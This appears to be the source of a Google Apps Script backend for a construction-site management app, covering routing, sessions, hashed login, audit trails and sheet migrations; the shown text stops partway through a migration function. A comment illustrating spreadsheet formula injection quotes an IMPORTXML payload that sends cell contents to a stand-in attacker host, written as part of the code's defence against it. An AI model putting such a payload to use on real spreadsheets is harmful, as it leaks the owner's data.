/*
 * Sistema de controle de obra — Av. Senador Teotônio Vilela
 * Copyright © 2026 Leonardo Maciel. Todos os direitos reservados.
 *
 * Software proprietário. O código estar visível não autoriza uso, cópia
 * nem obra derivada — ver LICENSE, na raiz do repositório.
 */
// ============================================================
// BACKEND — Apps Script do "Teotônio Vilela"
// COLE ESTE ARQUIVO INTEIRO no editor do Apps Script (Code.gs),
// salve e REPUBLIQUE (Implantar > Gerenciar implantações > editar
// > Nova versão). A URL /exec continua a mesma.
//
// Por que isto corrige os 2 bugs:
//   • "apagar não funciona"  -> deleteRDO apaga a linha pelo ID.
//   • "cria novos serviços"  -> o switch tem um DEFAULT que RETORNA ERRO
//     para ação desconhecida. Antes, sem o case 'deleteRDO', a requisição
//     caía num ramo que INSERIA linha. Agora isso é impossível.
// ============================================================

var NOME_ABA       = 'RDO_Avanco';   // aba dos serviços
var NOME_ABA_DIARIO = 'RDO_Diario';  // aba do RDO diário (ajuste se o nome for outro)
var ABA_AUDITORIA  = 'Auditoria';    // trilha de quem fez o quê (criada sozinha)
var ABA_EQUIP      = 'Equipamentos'; // frota da obra (própria e locada)
var ABA_LOCADORA   = 'Locadoras';
var ABA_APONT      = 'ApontEquip';   // apontamento diário de hora de máquina
var ABA_NF         = 'NotasFiscais';
var ABA_SAIDA      = 'EstoqueSaidas';

// Identificador desta obra na trilha de auditoria. Este backend atende UMA
// obra, mas o campo existe para a auditoria ter o mesmo formato do app
// "Gestor — Controle de Obras", que atende várias: assim o mesmo bloco de
// código roda nos dois, e uma consulta que junte as duas planilhas sabe de
// qual obra veio cada linha. As abas NotasFiscais e EstoqueSaidas já tinham
// a coluna `obra` desde sempre — só a Auditoria estava de fora.
var OBRA_ID        = 'teotonio';

// Pasta privada do Drive onde ficam os arquivos das notas. É o ÚNICO ponto em
// que o bloco de Notas Fiscais difere entre os dois apps — por isso virou
// constante, e o resto do bloco pôde ficar idêntico. NÃO altere o texto: o
// nome é a chave de busca da pasta, e mudar aqui faz o app criar uma pasta
// nova e perder de vista tudo o que já foi enviado.
var NF_PASTA_RAIZ  = 'Notas Fiscais Teotônio (Privado)';

// Cabeçalho das abas que este script cria quando não existem.
var HEADERS = {
  'Auditoria':    ['carimbo','usuario','perfil','acao','obra','registroId','detalhesAnteriores','detalhesNovos'],
  'Equipamentos': ['nome','tipo','vinculo','locadora','ativo'],
  'Locadoras':    ['nome','observacoes'],
  'ApontEquip':   ['carimbo','data','turno','equipamento','operador','inicio','fim','horas','paradas',
                   'horimIni','horimFim','combustivel','situacao','observacoes','assinatura','usuario','clientId'],
  'NotasFiscais': ['id','clientId','obra','numero','serie','chave','dataEmissao','dataEntrada','cnpj','razaoSocial',
                   'nomeFantasia','municipio','uf','vProd','vFrete','vTotal','vBaseICMS','vICMS','itens','obs',
                   'responsavel','status','driveId','driveLink','paginas','leitura','historico','usuario','criadoEm','atualizadoEm'],
  'EstoqueSaidas':['id','obra','materialId','descricao','un','qtd','data','capid','rua','responsavel','obs','usuario','criadoEm'],
  /* MEDIÇÕES FECHADAS. `itens` guarda o snapshot do que foi APRESENTADO à
     fiscalização naquela competência, em JSON. Sem isso, um lançamento
     retroativo reescrevia em silêncio a prévia de um mês já medido e já
     pago, e nada no sistema registrava o que tinha sido entregue. */
  'Medicoes':     ['id','obra','competencia','fechadaEm','fechadaPor','itens','observacao','reaberta','reabertaEm','reabertaPor']
};

// ------------------------------------------------------------
// ROTEADOR
// ------------------------------------------------------------
function doGet(e)  { return rotear(e); }
function doPost(e) { return rotear(e); }

function rotear(e) {
  var p = (e && e.parameter) ? e.parameter : {};
  var action = p.action || '';
  var resp;
  try {
    // SEGURANÇA: com a Propriedade do script EXIGIR_TOKEN = 'true', toda ação
    // que altera dados passa a exigir um token de sessão obtido via 'login'.
    // Enquanto a propriedade não existir, nada muda (migração sem quebrar o campo).
    var PROTEGIDAS = ['medicaoFechar', 'medicaoReabrir',
                      'deleteRDO', 'updateRDO', 'limparDuplicados', 'apagarPorPrefixoId',
                      'addBatchRDO', 'addRDODiario', 'updateRDODiario', 'deleteRDODiario',
                      'usuariosListar', 'usuarioSalvar', 'usuarioExcluir',
                      'rdoFoto', 'obterFoto',
                      'equipListar', 'equipCadastrar', 'equipDesativar', 'locadoraCadastrar',
                      'equipApontar', 'equipApagar', 'equipApontamentos',
                      'nfListar', 'nfSalvar', 'nfExcluir', 'nfImagem', 'nfLerIA', 'nfDiag',
                      'nfConsultarChave', 'saidaSalvar', 'saidaExcluir'];
    if (PROTEGIDAS.indexOf(action) !== -1) {
      var falhaAuth = exigirTokenSeAtivo(p.token);
      if (falhaAuth) return responder(falhaAuth, p.callback);
    }
    // Além do token (quem é), o perfil (o que pode) nas ações de lançamento.
    var DE_LANCAMENTO = ['addBatchRDO', 'addRDODiario', 'updateRDODiario'];
    if (DE_LANCAMENTO.indexOf(action) !== -1) {
      var falhaPerfil = exigirPodeLancar(p.token, action);
      if (falhaPerfil) return responder(falhaPerfil, p.callback);
    }
    // E a OBRA: quem só tem acesso ao Ranário não grava na Teotônio. A
    // checagem fica aqui, no roteador, e não dentro de nfSalvar/saidaSalvar —
    // essas duas são do bloco compartilhado com o app "Gestor", que precisa
    // continuar idêntico dos dois lados.
    var POR_OBRA = ['nfSalvar', 'saidaSalvar', 'equipApontar'];
    if (POR_OBRA.indexOf(action) !== -1) {
      var sessObraR = sessaoDoToken(p.token);
      if (sessObraR && !sessaoPodeNaObra(sessObraR, p.obra)) {
        return responder(negarPorObra(p.token, action, p.obra), p.callback);
      }
    }
    /* CONCORRÊNCIA. Metade das escritas já pega LockService (addBatchRDO,
       equipApontar, upsertRDODiario, deleteRDODiario, limparDuplicados,
       apagarPorPrefixoId). A outra metade opera por ÍNDICE DE LINHA lido de
       um snapshot — `getDataRange().getValues()`, acha a linha i, e depois
       `deleteRow(i)` / `setValue` / `getLastRow()+1`. Entre a leitura e a
       escrita, outra execução pode ter inserido ou apagado linha: o índice
       envelhece e a gravação cai na linha errada.

       Não é hipótese: quando o 4G volta, o `outboxFlush` do app dispara os
       itens da fila em sequência rápida, e duas `nfSalvar` disputando
       `getLastRow()+1` gravam uma por cima da outra.

       A trava vai aqui, no roteador, e só para as ações que ainda NÃO têm a
       sua — pegar de novo uma trava já tomada dentro da mesma execução é o
       tipo de coisa que só se descobre em produção. */
    var SEM_TRAVA_PROPRIA = ['deleteRDO', 'updateRDO', 'rdoFoto', 'equipApagar',
                             'nfSalvar', 'nfExcluir', 'saidaSalvar', 'saidaExcluir'];
    var travaRoteador = null;
    if (SEM_TRAVA_PROPRIA.indexOf(action) !== -1) {
      travaRoteador = LockService.getScriptLock();
      try {
        travaRoteador.waitLock(30000);
      } catch (eLock) {
        travaRoteador = null;
        return responder({ ok: false, error: 'Servidor ocupado gravando outro lançamento. Tente de novo.' }, p.callback);
      }
    }
    try {
    switch (action) {
      // `recursos` diz ao app o que ESTA versão do backend sabe fazer. Sem
      // isso, o app só descobria tentando — e tentar guardar a folha 2 num
      // backend antigo apaga a folha 1, porque lá o nome do arquivo é o mesmo.
      case 'ping':            resp = { ok: true, pong: true, abas: [NOME_ABA, NOME_ABA_DIARIO],
                                       recursos: { paginas: true, miniatura: true, obraNaListagem: true } }; break;
      case 'login':           resp = loginUsuario(p.usuario, p.senha); break;
      case 'logout':          resp = sessaoRevogar(p.token); break;
      case 'deleteRDO':       resp = deleteRDO(p.id, p.token); break;
      case 'addBatchRDO':     resp = addBatchRDO(p.batch, p.clientId, p.token); break;
      case 'updateRDO':       resp = updateRDO(p.payload, p.token); break;
      // As duas reescrevem a aba RDO_Avanco INTEIRA — que é a base da medição.
      // Vão com o token, e lá dentro exigem admin de verdade e deixam rastro.
      case 'limparDuplicados': resp = limparDuplicadosServidor(p.token); break;
      case 'apagarPorPrefixoId': resp = apagarPorPrefixoId(p.prefixo, p.token); break;
      case 'producaoPorPacote': resp = producaoPorPacote(p.mes, p.obra); break;
      case 'addRDODiario':    resp = upsertRDODiario(p, false); break;
      case 'updateRDODiario': resp = upsertRDODiario(p, true); break;
      case 'deleteRDODiario': resp = deleteRDODiario(p.id, p.data, p.token); break;
      case 'equipListar':       resp = equipListar(); break;
      case 'equipCadastrar':    resp = equipCadastrar(p); break;
      case 'equipDesativar':    resp = equipDesativar(p.nome, p.token); break;
      case 'locadoraCadastrar': resp = locadoraCadastrar(p.nome, p.observacoes); break;
      case 'equipApontar':      resp = equipApontar(p); break;
      case 'equipApagar':       resp = equipApagar(p.carimbo, p.token); break;
      case 'equipApontamentos': resp = equipApontamentos(p.mes); break;
      case 'nfListar':          resp = nfListar(p.obra); break;
      case 'nfSalvar':          resp = nfSalvar(p); break;
      case 'nfExcluir':         resp = nfExcluir(p.obra, p.id, p.token); break;
      case 'nfImagem':          resp = nfImagem(p); break;
      case 'nfLerIA':           resp = nfLerIA(p); break;
      case 'nfDiag':            resp = nfDiag(); break;
      case 'nfConsultarChave':  resp = nfConsultarChave(p); break;
      case 'saidaSalvar':       resp = saidaSalvar(p); break;
      case 'saidaExcluir':      resp = saidaExcluir(p.obra, p.id, p.token); break;
      case 'clima':           resp = climaDoDia(p.data, p.obra); break;
      case 'rdoFoto':         resp = rdoFoto(p); break;
      case 'obterFoto':       resp = obterFotoPrivada(p.fileId, p.mini); break;
      case 'usuariosListar':  resp = usuariosListar(p.token); break;
      case 'usuarioSalvar':   resp = usuarioSalvar(p); break;
      case 'usuarioExcluir':  resp = usuarioExcluir(p); break;
      case 'usuariosNomes':   resp = usuariosNomes(); break;
      case 'medicaoListar':   resp = medicaoListar(p.obra); break;
      case 'medicaoFechar':   resp = medicaoFechar(p); break;
      case 'medicaoReabrir':  resp = medicaoReabrir(p); break;
      default:
        // NUNCA inserir nada aqui. Ação desconhecida = erro, e ponto.
        resp = { ok: false, error: 'Ação desconhecida: "' + action + '"' };
    }
    } finally {
      if (travaRoteador) travaRoteador.releaseLock();
    }
  } catch (err) {
    resp = { ok: false, error: String(err && err.message ? err.message : err) };
  }
  return responder(resp, p.callback);
}

// ------------------------------------------------------------
// SEGURANÇA — login no servidor + token de sessão.
//
// Configuração (Apps Script > ⚙ Configurações do projeto > Propriedades do script):
//   USUARIOS     = {"Leonardo":{"senha":"<hash>","perfil":"admin"}, ...}
//                  (o formato antigo {"Leonardo":"senha-em-texto"} continua valendo)
//   EXIGIR_TOKEN = true
//
// Com USUARIOS definido, o app valida a senha AQUI (senha some do HTML).
// Com EXIGIR_TOKEN=true, escrever/apagar sem token válido é recusado — quem
// tiver só a URL do /exec não consegue mais injetar nem apagar dados.
// O token vale 6 h e renova a cada uso, e carrega o PERFIL de quem entrou.
// IMPORTANTE: troque as senhas ao configurar — as antigas ficaram públicas
// no histórico do repositório.
// ------------------------------------------------------------

// A senha sai do app em texto e é guardada aqui hasheada. O sal fixo não
// substitui um KDF, mas tira a senha legível das Propriedades do script —
// que é o risco real aqui (quem abre a planilha lê a propriedade).
function hashSenha(senha) {
  var raw = Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, String(senha) + '_teotonio_salt_2026');
  var out = '';
  for (var i = 0; i < raw.length; i++) {
    var b = raw[i];
    if (b < 0) b += 256;
    var s = b.toString(16);
    if (s.length === 1) s = '0' + s;
    out += s;
  }
  return out;
}

function loginUsuario(usuario, senha) {
  var u = String(usuario || '').trim();
  if (!u || !senha) return { ok: false, error: 'CREDENCIAIS_INVALIDAS' };

  // Trava por usuário: 5 erros seguidos fecham a porta por 15 min.
  var cache = CacheService.getScriptCache();
  var chaveErros = 'fail_u_' + u.toLowerCase();
  var erros = parseInt(cache.get(chaveErros) || '0', 10);
  if (erros >= 5) {
    return { ok: false, error: 'MUITAS_TENTATIVAS',
      mensagem: 'Conta temporariamente bloqueada (15 min) por excesso de tentativas.' };
  }

  var raw = PropertiesService.getScriptProperties().getProperty('USUARIOS');
  if (!raw) return { ok: false, error: 'LOGIN_NAO_CONFIGURADO' };
  var usuarios;
  try { usuarios = JSON.parse(raw); }
  catch (e) { return { ok: false, error: 'Propriedade USUARIOS não é um JSON válido' }; }

  var conf = usuarios[u] || usuarios[u.toLowerCase()];
  if (!conf) {
    cache.put(chaveErros, String(erros + 1), 900);
    Utilities.sleep(500);                       // desincentiva tentativa e erro em massa
    return { ok: false, error: 'CREDENCIAIS_INVALIDAS' };
  }

  var senhaEsperada = usuarioSenhaDe(conf);
  var perfil = usuarioPerfilDe(u, conf);
  // aceita a senha em texto (formato antigo) ou o hash (formato novo)
  var valida = String(senhaEsperada) === String(senha) || String(senhaEsperada) === hashSenha(senha);
  if (!valida) {
    cache.put(chaveErros, String(erros + 1), 900);
    Utilities.sleep(500);
    return { ok: false, error: 'CREDENCIAIS_INVALIDAS' };
  }

  cache.remove(chaveErros);
  var token = sessaoCriar(u, perfil, usuarioObrasDe(conf));
  registrarAuditoria(u, perfil, 'LOGIN', OBRA_ID, '-', '', 'Login efetuado com sucesso');
  return { ok: true, usuario: u, perfil: perfil, token: token,
           obras: usuarioObrasDe(conf) };
}

/* ------------------------------------------------------------------
   SESSÃO — dura até a pessoa sair, não até o cache do Google esquecer
   ------------------------------------------------------------------
   A sessão ficava no CacheService. Isso parecia dar 6 horas, mas o
   CacheService é CACHE, não armazenamento: o Google descarta a entrada
   quando quer, e toda republicação do Apps Script limpa tudo. Na prática
   o apontador era deslogado a esmo — no meio de lançar uma nota, quase
   sempre sem entender por quê.

   Agora a sessão vive nas Propriedades do script, que são duráveis. Ela
   NÃO expira sozinha: sai quando a pessoa clica em Sair (revogação de
   verdade, no servidor) ou quando a faxina remove o que está abandonado
   há muito tempo — as Propriedades têm teto de 500 KB no total, e sessão
   sem faxina cresceria para sempre.
   ------------------------------------------------------------------ */
var SESSAO_PREFIXO   = 'SES_';
var SESSAO_ABANDONO  = 365;   // dias sem uso até a faxina levar

function sessaoCriar(usuario, perfil, obras) {
  var token = Utilities.getUuid();
  var agora = Date.now();
  PropertiesService.getScriptProperties().setProperty(SESSAO_PREFIXO + token,
    JSON.stringify({ u: usuario, p: perfil, o: obras, criadoEm: agora, usoEm: agora }));
  return token;
}

function sessaoDoToken(token) {
  if (!token) return null;
  var props = PropertiesService.getScriptProperties();
  var chave = SESSAO_PREFIXO + String(token);
  var raw = props.getProperty(chave);

  if (!raw) {
    // Quem estava logado ANTES desta versão tem token no cache antigo.
    // Em vez de derrubar todo mundo na atualização, a sessão é promovida
    // para o formato novo na primeira vez que ele aparece.
    var doCache = null;
    try { doCache = CacheService.getScriptCache().get('tok_' + String(token)); } catch (e) {}
    if (!doCache) return null;
    var velha;
    try { velha = JSON.parse(doCache); } catch (e) { velha = { usuario: doCache, perfil: 'engenharia' }; }
    var agoraM = Date.now();
    var promovida = { u: velha.usuario, p: velha.perfil || 'engenharia', o: '*',
                      criadoEm: agoraM, usoEm: agoraM };
    props.setProperty(chave, JSON.stringify(promovida));
    return { usuario: promovida.u, perfil: promovida.p, obras: promovida.o };
  }

  var s;
  try { s = JSON.parse(raw); } catch (e) { return null; }

  // O carimbo de último uso só é regravado depois de um dia. Gravar
  // Propriedade a cada requisição seria lento e disputaria trava à toa —
  // e a precisão de horas não muda nada para uma faxina anual.
  var agora = Date.now();
  if (!s.usoEm || (agora - s.usoEm) > 86400000) {
    s.usoEm = agora;
    try { props.setProperty(chave, JSON.stringify(s)); } catch (e) {}
  }
  return { usuario: s.u, perfil: s.p, obras: (s.o === undefined ? '*' : s.o) };
}

/* Sair de verdade: o token deixa de valer no SERVIDOR. Antes o logout só
   limpava o aparelho, e o token continuava aceito por quem o copiasse. */
function sessaoRevogar(token) {
  if (!token) return { ok: true };
  var s = sessaoDoToken(token);
  try { PropertiesService.getScriptProperties().deleteProperty(SESSAO_PREFIXO + String(token)); } catch (e) {}
  try { CacheService.getScriptCache().remove('tok_' + String(token)); } catch (e) {}
  if (s) registrarAuditoria(s.usuario, s.perfil, 'LOGOUT', OBRA_ID, '-', '', 'Saiu do sistema');
  return { ok: true };
}

/* -------------------------------------------------------------------
   Derruba TODAS as sessões de um usuário.
   -------------------------------------------------------------------
   A sessão guarda perfil e obras no momento do login e nunca reconsulta a
   propriedade USUARIOS. Sem isto, excluir alguém, rebaixar o perfil ou
   trocar a senha não tinha efeito nenhum sobre quem já estava dentro: o
   token continuava valendo, com o perfil ANTIGO, até alguém clicar em Sair
   — que é justamente o que o demitido não vai fazer.
   ------------------------------------------------------------------- */
function sessoesDoUsuarioRevogar(nome, motivo) {
  var alvo = String(nome == null ? '' : nome).trim().toLowerCase();
  if (!alvo) return 0;
  var props = PropertiesService.getScriptProperties();
  var todas = props.getProperties();
  var n = 0;
  Object.keys(todas).forEach(function (k) {
    if (k.indexOf(SESSAO_PREFIXO) !== 0) return;
    var s;
    try { s = JSON.parse(todas[k]); } catch (e) { return; }
    var dono = String((s && (s.u || s.usuario)) || '').trim().toLowerCase();
    if (dono !== alvo) return;
    try { props.deleteProperty(k); } catch (e) {}
    try { CacheService.getScriptCache().remove('tok_' + k.slice(SESSAO_PREFIXO.length)); } catch (e) {}
    n++;
  });
  if (n) registrarAuditoria('sistema', 'admin', 'SESSOES_REVOGADAS', OBRA_ID, nome, '',
    n + ' sessão(ões) derrubada(s) · ' + (motivo || ''));
  return n;
}

/* Remove sessões abandonadas. Roda sozinha pelo gatilho diário. */
function limparSessoesAbandonadas() {
  // Aproveita a faxina para descer a trilha de login/logout que ainda não
  // foi gravada — garante que ela chega à planilha nem que ninguém lance
  // nada no dia. (Antes da limpeza: as chaves AUDQ_ não são sessões, mas
  // ler a loja inteira duas vezes seria desperdício.)
  auditoriaDescarregar();

  var props = PropertiesService.getScriptProperties();
  var todas = props.getProperties();
  var corte = Date.now() - SESSAO_ABANDONO * 86400000;
  var n = 0;
  Object.keys(todas).forEach(function (k) {
    if (k.indexOf(SESSAO_PREFIXO) !== 0) return;
    var s;
    try { s = JSON.parse(todas[k]); } catch (e) { props.deleteProperty(k); n++; return; }
    if (!s.usoEm || s.usoEm < corte) { props.deleteProperty(k); n++; }
  });
  Logger.log('sessões removidas por abandono: ' + n);
  return { ok: true, removidas: n };
}

function usuarioDoToken(token) {
  var s = sessaoDoToken(token);
  return s ? s.usuario : null;
}

// ---- Quem apaga: o ADMIN, ou a própria pessoa que lançou. ----
// Esconder o botão no app não é segurança: quem souber a URL do /exec manda o
// pedido direto. A regra vale AQUI, que é onde o dado mora.
function perfilDoToken(token) {
  var s = sessaoDoToken(token);
  var p = s && s.perfil ? String(s.perfil).toLowerCase().trim() : '';
  var apelidos = { administrador: 'admin', master: 'admin', engenheiro: 'engenharia',
                   apontador: 'campo', diretor: 'diretoria' };
  return apelidos[p] || p;
}

function ehAdminToken(token) {
  // sem EXIGIR_TOKEN o backend está aberto de propósito (modo de implantação):
  // nesse caso não há perfil para checar
  var exigir = PropertiesService.getScriptProperties().getProperty('EXIGIR_TOKEN');
  if (String(exigir).toLowerCase() !== 'true') return true;
  return perfilDoToken(token) === 'admin';
}

function podeApagarLinha(token, donoDaLinha) {
  if (ehAdminToken(token)) return true;
  var meu = usuarioDoToken(token) || '';
  var dele = String(donoDaLinha == null ? '' : donoDaLinha).trim();
  if (!meu || !dele) return false;            // registro sem dono: só o admin
  return dele.toLowerCase() === String(meu).trim().toLowerCase();
}

/* Exige perfil de administrador DE VERDADE, mesmo com EXIGIR_TOKEN desligado.
   `ehAdminToken` devolve true quando a proteção está desligada — o que é certo
   para o modo de implantação, e errado para operação em MASSA sobre a base da
   medição. Aqui a porta é fechada nos dois casos. */
function exigirAdminEstrito(token, acao) {
  var exigir = PropertiesService.getScriptProperties().getProperty('EXIGIR_TOKEN');
  if (String(exigir).toLowerCase() !== 'true') {
    return { ok: false, error: 'Operação em massa exige EXIGIR_TOKEN = true nas Propriedades do script.' };
  }
  if (!sessaoDoToken(token)) return { ok: false, error: 'TOKEN_INVALIDO' };
  if (perfilDoToken(token) !== 'admin') {
    registrarAuditoria(usuarioDoToken(token) || '?', perfilDoToken(token) || '?',
      'NEGADO:' + acao, '', '', '', 'perfil sem permissão para operação em massa');
    return { ok: false, error: 'SEM_PERMISSAO' };
  }
  return null;
}

/* -------------------------------------------------------------------
   seguro() — texto do cliente nunca vira FÓRMULA na planilha
   -------------------------------------------------------------------
   setValue/setValues do Apps Script interpretam string começando com "="
   como fórmula. Uma observação de RDO escrita como
   =IMPORTXML("http://servidor-do-atacante/?x"&A1) roda com a conta do DONO
   da planilha e vaza o conteúdo dela. O apóstrofo à frente força texto e NÃO
   aparece para quem lê a célula, nem no CSV publicado — é o mesmo truque que
   a `chave` da nota fiscal já usava.
   ------------------------------------------------------------------- */
function seguro(v) {
  if (typeof v !== 'string') return v;
  return /^[=+\-@]/.test(v) ? "'" + v : v;
}
function seguroLinha(arr) {
  return arr.map(function (v) { return seguro(v); });
}
function seguroMatriz(m) {
  return m.map(function (linha) { return seguroLinha(linha); });
}

function exigirTokenSeAtivo(token) {
  var exigir = PropertiesService.getScriptProperties().getProperty('EXIGIR_TOKEN');
  if (String(exigir).toLowerCase() !== 'true') return null; // proteção ainda desligada
  if (sessaoDoToken(token)) return null;
  return { ok: false, error: 'TOKEN_INVALIDO' };
}

// ------------------------------------------------------------
// AUDITORIA — quem fez o quê, quando. Nunca derruba a operação:
// falha ao registrar não pode impedir o apontador de gravar o RDO.
// ------------------------------------------------------------
function getOrCreateAba(nome) {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var a = ss.getSheetByName(nome);
  if (!a) {
    a = ss.insertSheet(nome);
    if (HEADERS[nome]) a.appendRow(HEADERS[nome]);
  }
  return a;
}

/* Assinatura IGUAL à do app "Gestor — Controle de Obras", inclusive o
   parâmetro `obra` — é o que permite este bloco ser o mesmo nos dois.
   Se a planilha ainda estiver no formato antigo (sem a coluna `obra`),
   rode UMA VEZ `migrarAuditoriaParaMultiObra()`, abaixo. */
/* ------------------------------------------------------------------
   MULTI-OBRA NAS ABAS DE LANÇAMENTO
   ------------------------------------------------------------------
   RDO_Avanco e RDO_Diario passaram a receber lançamento de mais de uma
   obra, separados pela coluna `obra` — o mesmo desenho que NotasFiscais
   e EstoqueSaidas já usavam.

   Linha SEM valor na coluna é da Teotônio: são as que foram gravadas
   quando este backend atendia uma obra só.
   ------------------------------------------------------------------ */
function normObra(v) {
  return String(v == null ? '' : v).trim() || OBRA_ID;
}

/* Devolve o índice da coluna, criando-a no fim do cabeçalho se faltar.
   Mesmo padrão que o addBatchRDO já usava para `clientId` e `usuario`:
   a planilha se ajusta sozinha na primeira gravação, sem ninguém precisar
   editar cabeçalho à mão antes de o campo poder lançar. */
function garantirColuna(aba, nome) {
  var cab = cabecalhoNormalizado(aba);
  var i = idxColuna(cab, nome);
  if (i !== -1) return i;
  aba.getRange(1, aba.getLastColumn() + 1).setValue(nome);
  return idxColuna(cabecalhoNormalizado(aba), nome);
}

// O fuso do script não muda no meio da execução: perguntar uma vez basta.
var _FUSO = null;
function fusoDoScript() {
  if (!_FUSO) _FUSO = Session.getScriptTimeZone();
  return _FUSO;
}

/* ------------------------------------------------------------------
   AUDITORIA DE LOGIN — fora do caminho crítico
   ------------------------------------------------------------------
   Registrar o LOGIN abria a planilha e gravava uma linha DENTRO do
   pedido de login. Abrir a planilha é a operação mais cara do Apps
   Script, e era a ÚNICA razão de o login tocar a planilha: quem entra
   não altera dado nenhum. Ou seja, toda vez que alguém entrava no
   sistema, esperava alguns segundos por uma linha de log que ninguém
   vai ler naquele instante.

   Agora LOGIN e LOGOUT deixam a linha numa propriedade própria
   (AUDQ_<carimbo>_<uuid>) — uma gravação curta — e ela desce para a
   planilha no primeiro pedido que já for abrir a planilha de qualquer
   jeito, ou na faxina diária. A trilha continua completa e na ordem
   certa (o carimbo em milissegundos está no nome da chave); o que
   mudou é que não é mais o apontador que espera por ela.

   Uma chave POR LINHA, e não uma lista numa chave só, de propósito:
   dois logins ao mesmo tempo não têm como sobrescrever um ao outro,
   e nenhuma linha esbarra no teto de 9 KB por valor.
   ------------------------------------------------------------------ */
var AUDITORIA_FILA_PREFIXO = 'AUDQ_';
var AUDITORIA_COLUNAS = 8;
var _audSeq = 0;

/* A chave carrega o instante para a fila sair na ordem certa. Milissegundo
   sozinho não basta: duas linhas da MESMA execução caem no mesmo carimbo e
   a ordem passaria a ser a do UUID, ou seja, sorteada. Por isso o contador. */
function auditoriaChave() {
  var ms = String(Date.now());
  while (ms.length < 14) ms = '0' + ms;              // sorteia por texto: tem de ter largura fixa
  var seq = String(_audSeq++);
  while (seq.length < 4) seq = '0' + seq;
  return AUDITORIA_FILA_PREFIXO + ms + '_' + seq + '_' + Utilities.getUuid();
}

function auditoriaEnfileirar(linha) {
  try {
    PropertiesService.getScriptProperties().setProperty(auditoriaChave(), JSON.stringify(linha));
  } catch (e) {}
}

/* Desce para a planilha tudo que está na fila, numa gravação só.
   Recebe a aba quando quem chamou já a tem em mãos — assim não paga
   um segundo `getActiveSpreadsheet()`. Nunca derruba a operação. */
function auditoriaDescarregar(aba) {
  try {
    var props = PropertiesService.getScriptProperties();
    var todas = props.getProperties();
    var chaves = Object.keys(todas).filter(function (k) {
      return k.indexOf(AUDITORIA_FILA_PREFIXO) === 0;
    });
    if (!chaves.length) return 0;
    chaves.sort();                       // AUDQ_<millis>_… ordena por tempo
    var linhas = [];
    chaves.forEach(function (k) {
      var l;
      try { l = JSON.parse(todas[k]); } catch (e) { return; }
      if (!l || !l.length) return;
      while (l.length < AUDITORIA_COLUNAS) l.push('');   // setValues exige retângulo
      linhas.push(l.slice(0, AUDITORIA_COLUNAS));
    });
    if (linhas.length) {
      var a = aba || getOrCreateAba(ABA_AUDITORIA);
      a.getRange(a.getLastRow() + 1, 1, linhas.length, AUDITORIA_COLUNAS).setValues(linhas);
    }
    // só apaga depois de gravar: se a gravação falhar, a fila fica de pé
    chaves.forEach(function (k) { try { props.deleteProperty(k); } catch (e) {} });
    return linhas.length;
  } catch (e) { return 0; }
}

function registrarAuditoria(usuario, perfil, acao, obra, registroId, antes, depois) {
  var linha = [Utilities.formatDate(new Date(), fusoDoScript(), 'yyyy-MM-dd HH:mm:ss'),
               usuario || 'sistema', perfil || 'sistema', acao, obra || 'global',
               registroId || '', String(antes || ''), String(depois || '')];
  // Entrar e sair não mexem em dado: não vale abrir a planilha por isso.
  if (acao === 'LOGIN' || acao === 'LOGOUT') { auditoriaEnfileirar(linha); return; }
  try {
    var a = getOrCreateAba(ABA_AUDITORIA);
    auditoriaDescarregar(a);             // a planilha já está aberta: aproveita
    a.appendRow(linha);
  } catch (e) {}
}

/* ------------------------------------------------------------------
   MIGRAÇÃO — insere a coluna `obra` na Auditoria já existente
   ------------------------------------------------------------------
   Rode UMA VEZ no editor do Apps Script, depois de colar este arquivo
   e ANTES de usar o app. Sem isso, as linhas gravadas antes desta versão
   ficam com `registroId`, `detalhesAnteriores` e `detalhesNovos` uma
   coluna à esquerda das novas — a trilha continua lá, mas desalinhada,
   que num log de auditoria é o mesmo que perdida.

   É seguro rodar de novo: se a coluna já existir, não faz nada.
   ------------------------------------------------------------------ */
function migrarAuditoriaParaMultiObra() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var a = ss.getSheetByName(ABA_AUDITORIA);
  if (!a) { Logger.log('Aba Auditoria ainda não existe — nada a migrar.'); return; }

  var ultimaCol = a.getLastColumn();
  if (ultimaCol < 1) { Logger.log('Auditoria vazia — nada a migrar.'); return; }

  var cab = a.getRange(1, 1, 1, ultimaCol).getValues()[0].map(function (c) {
    return String(c || '').trim().toLowerCase();
  });
  if (cab.indexOf('obra') > -1) {
    Logger.log('A coluna "obra" já existe (posição ' + (cab.indexOf('obra') + 1) + '). Nada a fazer.');
    return;
  }

  // a coluna entra em 5, logo depois de `acao` — mesma posição do outro app
  a.insertColumnBefore(5);
  a.getRange(1, 5).setValue('obra');

  var linhas = a.getLastRow() - 1;
  if (linhas > 0) {
    // tudo que já estava aqui é desta obra, por definição: é um backend só dela
    var valores = [];
    for (var i = 0; i < linhas; i++) valores.push([OBRA_ID]);
    a.getRange(2, 5, linhas, 1).setValues(valores);
  }
  Logger.log('Auditoria migrada: coluna "obra" inserida e ' + linhas +
             ' linha(s) marcadas como "' + OBRA_ID + '".');
}

/* ------------------------------------------------------------------
   MIGRAÇÃO — coluna `obra` nas abas de LANÇAMENTO
   ------------------------------------------------------------------
   Rode UMA VEZ, depois de colar este arquivo. Acrescenta a coluna `obra`
   em RDO_Avanco e RDO_Diario e marca tudo que já existe como "teotonio",
   que é de onde vieram: até esta versão o backend atendia uma obra só.

   Diferente da Auditoria, aqui a coluna entra no FIM do cabeçalho e não
   no meio — assim nenhuma coluna existente muda de posição, e qualquer
   fórmula, filtro ou CSV publicado que aponte para elas continua valendo.

   É seguro rodar de novo: coluna que já existe é apenas preenchida onde
   estiver vazia.
   ------------------------------------------------------------------ */
function migrarObraNasAbasDeRDO() {
  [NOME_ABA, NOME_ABA_DIARIO].forEach(function (nome) {
    var aba = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(nome);
    if (!aba) { Logger.log('Aba "' + nome + '" não existe — pulando.'); return; }

    var iObra = garantirColuna(aba, 'obra');
    if (iObra === -1) { Logger.log('Aba "' + nome + '": não consegui criar a coluna.'); return; }

    var ultima = aba.getLastRow();
    if (ultima < 2) { Logger.log('Aba "' + nome + '": sem linhas de dados.'); return; }

    var col = aba.getRange(2, iObra + 1, ultima - 1, 1);
    var vals = col.getValues();
    var mudou = 0;
    for (var i = 0; i < vals.length; i++) {
      if (String(vals[i][0] == null ? '' : vals[i][0]).trim() === '') {
        vals[i][0] = OBRA_ID; mudou++;
      }
    }
    if (mudou) col.setValues(vals);
    Logger.log('Aba "' + nome + '": ' + mudou + ' linha(s) marcadas como "' + OBRA_ID +
               '" (de ' + vals.length + ').');
